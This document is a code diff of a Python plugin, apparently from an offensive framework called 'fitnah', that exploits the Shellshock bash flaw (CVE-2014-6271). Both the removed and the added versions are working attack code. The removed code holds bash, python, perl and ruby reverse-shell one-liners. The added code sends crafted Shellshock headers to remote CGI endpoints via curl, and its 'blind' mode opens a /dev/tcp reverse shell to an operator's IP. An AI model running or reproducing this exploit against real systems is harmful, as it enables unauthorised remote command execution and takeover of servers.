@@ -1,120 +1,74 @@
-﻿
-"""execution/shellshock — ShellShock (CVE-2014-6271) exploitation module."""
-import subprocess
-from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre
+"""
+execution/shellshock — CVE-2014-6271 Shellshock exploitation. MITRE T1190 / T1059.004.
+Sends a crafted HTTP request with a Shellshock payload via curl on the agent.
+No PowerShell — uses ctx.exec() with curl which is available on all modern Windows/Linux targets.
+"""
+from __future__ import annotations
+
+from fitnah.sdk import BasePlugin, ModuleResult
+from fitnah.sdk.schema import Param, ParamSchema
 
 
-class ShellShock(BasePlugin):
-    """
-    CVE-2014-6271 (ShellShock) and advanced shell exploitation:
-    - Detect vulnerable bash versions
-    - Exploit ShellShock
-    - Create reverse shell
-    - Environment variable injection
-    """
+class ShellshockExploit(BasePlugin):
     NAME        = "shellshock"
-    DESCRIPTION = "Detect/exploit CVE-2014-6271, create reverse shells via ShellShock or direct shell."
+    DESCRIPTION = "Exploit CVE-2014-6271 Shellshock on remote CGI targets via curl (no PowerShell). MITRE T1190"
     AUTHOR      = "fitnah-team"
     MITRE       = "T1190"
     CATEGORY    = "execution"
-    schema      = ParamSchema().add(
-        Param("mode",       str, required=True,  default="detect",
-              help="Mode: detect | exploit | reverse_shell",
-              validator=lambda v: v in ("detect", "exploit", "reverse_shell")),
-        Param("command",    str, required=False, default="id",
-              help="Command to execute (exploit/reverse_shell modes)"),
-        Param("target",     str, required=False, default="",
-              help="Target IP for reverse_shell"),
-        Param("port",       int, required=False, default=4444,
-              help="Target port for reverse_shell"),
-        Param("shell_type", str, required=False, default="bash",
-              help="Reverse shell type: bash | python | perl | ruby",
-              validator=lambda v: v in ("bash", "python", "perl", "ruby")),
+
+    schema = ParamSchema().add(
+        Param("target_url",   str, required=True,
+              help="Full URL of CGI endpoint (e.g. http://192.168.1.1/cgi-bin/test.cgi)"),
+        Param("command",      str, required=False, default="id",
+              help="Shell command to execute on the remote target"),
+        Param("header",       str, required=False, default="User-Agent",
+              help="HTTP header to inject: User-Agent | Referer | Cookie"),
+        Param("mode",         str, required=False, default="exec",
+              help="exec (capture output) | blind (fire-and-forget) | detect"),
+        Param("callback_ip",  str, required=False, default="",
+              help="[blind] Operator IP for reverse shell callback"),
+        Param("callback_port", int, required=False, default=4444),
+        Param("timeout",       int, required=False, default=15),
     )
 
-    @mitre("T1190")
-    def run(self, session, params, ctx=None):
-        mode = params["mode"]
+    def run(self, session, params, ctx=None) -> ModuleResult:
+        if ctx is None:
+            return ModuleResult.err("Requires live session")
+
+        url      = params.get("target_url", "")
+        command  = params.get("command", "id")
+        header   = params.get("header", "User-Agent")
+        mode     = params.get("mode", "exec").lower()
+        cb_ip    = params.get("callback_ip", "")
+        cb_port  = int(params.get("callback_port", 4444))
+        timeout  = int(params.get("timeout", 15))
+
+        if not url:
+            return ModuleResult.err("target_url is required")
 
         if mode == "detect":
-            return self.detect_vulnerable_bash()
-        elif mode == "exploit":
-            cmd = params.get("command", "id")
-            return self.exploit_shellshock(cmd)
-        elif mode == "reverse_shell":
-            target = params.get("target", "")
-            if not target:
-                return ModuleResult.err("Target IP required for reverse_shell mode")
-            port = params.get("port", 4444)
-            return self.reverse_shell(target, port, params.get("shell_type", "bash"))
-        return ModuleResult.err("Invalid mode")
+            payload = "() { :;}; echo SHELLSHOCK_VULN"
+        elif mode == "blind" and cb_ip:
+            payload = f"() {{ :;}}; /bin/bash -i >& /dev/tcp/{cb_ip}/{cb_port} 0>&1 &"
+        else:
+            payload = f"() {{ :;}}; echo Content-Type: text/plain; echo; {command} 2>&1"
 
-    @staticmethod
-    def detect_vulnerable_bash():
-        """Check bash version and vulnerability to ShellShock (CVE-2014-6271)."""
-        try:
-            # Test for ShellShock
-            test_cmd = "env x='() { :;}; echo vulnerable' bash -c 'echo safe"
-            proc = subprocess.run(
-                test_cmd,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=10
-            )
-            if "vulnerable" in proc.stdout:
-                return ModuleResult.ok(data={
-                    "vulnerable": True,
-                    "stdout": proc.stdout,
-                    "stderr": proc.stderr
-                })
-            return ModuleResult.ok(data={"vulnerable": False})
-        except Exception as e:
-            return ModuleResult.err(str(e))
+        # Use curl — present on Windows 10+, all Linux/macOS targets
+        curl_cmd = (
+            f'curl -sk --max-time {timeout} '
+            f'-H "{header}: {payload}" '
+            f'"{url}"'
+        )
 
-    @staticmethod
-    def exploit_shellshock(cmd, ctx=None):
-        """Exploit string: () { :;}; /bin/bash -c 'command'."""
-        exploit_cmd = f"env x='() {{ :;}}; {cmd}' bash -c 'echo done'"
-        try:
-            proc = subprocess.run(
-                exploit_cmd,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=30
-            )
-            return ModuleResult.ok(data={
-                "stdout": proc.stdout,
-                "stderr": proc.stderr
-            })
-        except Exception as e:
-            return ModuleResult.err(str(e))
+        r = ctx.exec(curl_cmd)
+        if r["status"] != "ok":
+            return ModuleResult.err(f"shellshock curl failed: {r['output']}")
 
-    @staticmethod
-    def reverse_shell(target, port, shell_type="bash"):
-        """
-        Bash reverse shell, Python reverse shell, Ruby reverse shell, Perl reverse shell.
-        """
-        shells = {
-            "bash": f"bash -i >& /dev/tcp/{target}/{port} 0>&1",
-            "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{target}',{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'",
-            "perl": f"perl -e 'use Socket;$i=\"{target}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
-            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{target}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&3 >&3 2>&3\")'"
-        }
-        payload = shells.get(shell_type, shells["bash"])
-        exploit = f"env x='() {{ :;}}; {payload}' bash -c 'echo connecting'"
-        try:
-            proc = subprocess.Popen(
-                exploit,
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True
+        out = r["output"]
+        if mode == "detect":
+            vuln = "SHELLSHOCK_VULN" in out
+            return ModuleResult.ok(
+                data=f"[{'VULNERABLE' if vuln else 'NOT VULNERABLE'}] {url}\n{out}",
+                loot_kind="shellshock",
             )
-            return ModuleResult.ok(data={
-                "status": "reverse shell spawned",
-                "payload": payload
-            })
-        except Exception as e:
-            return ModuleResult.err(str(e))
+        return ModuleResult.ok(data=out, loot_kind="shellshock")
